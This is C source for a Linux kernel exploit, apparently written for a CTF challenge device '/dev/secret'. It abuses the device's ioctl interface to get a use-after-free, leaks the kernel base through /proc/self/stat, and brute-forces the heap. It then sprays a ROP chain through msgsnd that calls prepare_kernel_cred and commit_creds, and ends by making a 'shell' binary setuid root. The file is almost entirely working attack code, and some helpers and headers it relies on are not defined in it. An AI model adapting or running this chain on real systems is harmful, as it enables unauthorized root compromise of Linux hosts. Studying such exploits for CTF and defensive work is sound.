#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sxattr_uffd.h>
#include <init.h>
#include <signal.h>

uint64_t heap_base, kbase = 0, modprobe_path = 0xe387c0;

#define info(name, value) printf("%s: 0x%lx\n", name, value)
#define calc_addr(name, addr, show) addr+=kbase; show==1 ? info(name, addr) : 1
#define log_error(msg) \
    perror(msg); \
    exit(0);

#define ADD 0x01C029
#define GET 0x01C07b
#define SET 0x01C082
#define DEL 0x01C087
#define MMAP_ADDR 0x1337000

typedef struct request_t {
    uint64_t value;
    uint64_t key;
} request_t;
request_t* req[0x50];
int g_idx = 0;

int g_fd = -1;
void open_device() {
    g_fd = open("/dev/secret", O_RDWR);
    if (g_fd < 0) {
        perror("Can't open device");
    }

    for (int i = 0; i < sizeof(req)/8; i++){
        req[i] = mmap((MMAP_ADDR+i*0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS| MAP_PRIVATE, 0, 0);
        if (*(uint64_t*)req[i] < 0) {
            perror("mmap fail");
        }
    }
}

void shell(){
    system("chown root:root shell");
    system("chmod a+s shell");
    exit(0);
}

void add_secret(uint64_t value, int lock) {
    req[g_idx]->value = value;
    if (lock) {lock_mmap((void*)req[g_idx], PROT_WRITE);}
    ioctl(g_fd, ADD, req[g_idx++]);
}

int get_secret(int idx) {
    return ioctl(g_fd, GET, req[idx]);
}

void set_secret(int idx, uint64_t value) {
    req[idx]->value = value;
    ioctl(g_fd, SET, req[idx]);
}

void del_secret(int idx) {
    ioctl(g_fd, DEL, req[idx]);
}

void brute_force_heap(int idx) {
    uint64_t heap_start = 0xffff888002781fe0;
    for (int offset = 0; offset < 0x20; offset++) {
        for (uint64_t step = 0; step < 0x1b2b40000000; step+=0x10000000) {
            req[idx]->key = heap_start + step + (offset << 12);
            if (get_secret(idx) != -1) {
                heap_base = req[idx]->key >> 12 << 12;
                return;
            }
        }
    }
    puts("[!] Kernel heap leak failed :(");
    _exit(EXIT_FAILURE);
}


uint64_t pop_rdi=0x43d222, prepare_kernel_cred=0x0007c2b0, xchg_rdi_rax=0x492cd3, commit_creds = 0x0007c100, \
    swapgs_restore_regs_and_return_to_usermode=0x00800ed0, pop_rdx=0x14f962, pop_rsp=0xc5528, ret_210=0x54723c, new_stack=0x1da030;
void spray_msgsnd() {
    uint64_t *payload = malloc(0x1000);
    int idx = 0;
    memset(payload, 0, 0x100);
    payload[idx++] = 1;
    payload[idx++] = pop_rdi;
    payload[idx++] = 0;
    payload[idx++] = prepare_kernel_cred;
    payload[idx++] = xchg_rdi_rax; // swap rax vs rdi
    payload[idx++] = commit_creds;
    payload[idx++] = swapgs_restore_regs_and_return_to_usermode+49;
    payload[idx++] = 0;
    payload[idx++] = 0;
    payload[idx++] = (uint64_t*)shell;
    payload[idx++] = user_cs;
    payload[idx++] = user_rflags;
    payload[idx++] = user_sp;
    payload[idx++] = user_ss;
    int mid[0x20];
    for (int s = 0; s < 0x20; s++)
    {
        mid[s] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (mid[s] == -1)
            error("msgget failed!");

        for (int j = 0; j < 4; j++)
        {
            if (msgsnd(mid[s], payload, 0x1000, 0))
                error("msgsnd failed!");
        }
    }
}

int main() {
    save_state();
    open_device();
    int tmp_fd = g_fd;
    open_device();

    for (int i = 0; i < 0x18+1; i++) { add_secret(*(uint64_t*)"chino\x00\x00", 0); }
    g_fd = tmp_fd;
    add_secret(*(uint64_t*)"chino\x00\x00", 0);

    close(g_fd);
    open_device();
    add_secret(*(uint64_t*)"chino\x00\x00", 1);
    // getchar();

    close(g_fd);
    open_device();

    int idx_victim = g_idx;
    add_secret(0, 0);

    int seq = open("/proc/self/stat", O_RDONLY);
    if (seq < 0) {perror("seq open"); exit(0);}
    close(seq);

    get_secret(idx_victim);
    kbase = (req[idx_victim]->value ^ req[idx_victim]->key) - 0x18ef50;
    info("kbase", kbase);
    close(g_fd);
    calc_addr("modprobe_path", modprobe_path, 1);
    calc_addr("pop rdi", pop_rdi, 1);
    calc_addr("commit_creds", commit_creds, 1);
    calc_addr("prepare_kernel_cred", prepare_kernel_cred, 1);
    calc_addr("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode, 0);
    calc_addr("xchg_rdi_rax", xchg_rdi_rax, 1);
    calc_addr("pop rsp", pop_rsp, 1);
    calc_addr("pop rdx", pop_rdx, 1);
    calc_addr("ret 210", ret_210, 1);

    open_device();
    add_secret(*(uint64_t*)"chino\x00\x00", 1);
    brute_force_heap(0);
    info("heap base", heap_base);

    seq = open("/proc/self/stat", O_RDONLY);
    uint64_t payload[4] = {ret_210,0,0,pop_rdi};
    setxattr_arg arg = {
        .addr = payload,
        .size = 0x20,
        .path = "./",
        .filename = "exploit"
    };
    setxattr(&arg);
    spray_msgsnd();
    new_stack+=heap_base;
    info("stack pivot", new_stack);
    __asm__(
        ".intel_syntax noprefix;"
        "mov r15, 0x11111111;"
        "mov r14, pop_rsp;"
        "mov r13, new_stack;"
        "mov r12, 0x44444444;"
        "mov rbp, 0x55555555;"
        "mov rbx, 0x66666666;"
        "mov rcx, 0x77777777;"
        "mov r8, 0x88888888;"
        "mov r9, 0x99999999;"
        "mov r10, 0xaaaaaaaa;"
        "mov r11, 0xbbbbbbbb;"
        "mov rax, 0;"
        "mov edi, [rsp+0xc];"
        "mov rsi, rsp;"
        "mov rdx, 1;"
        "syscall;"
        ".att_syntax;"
    );

}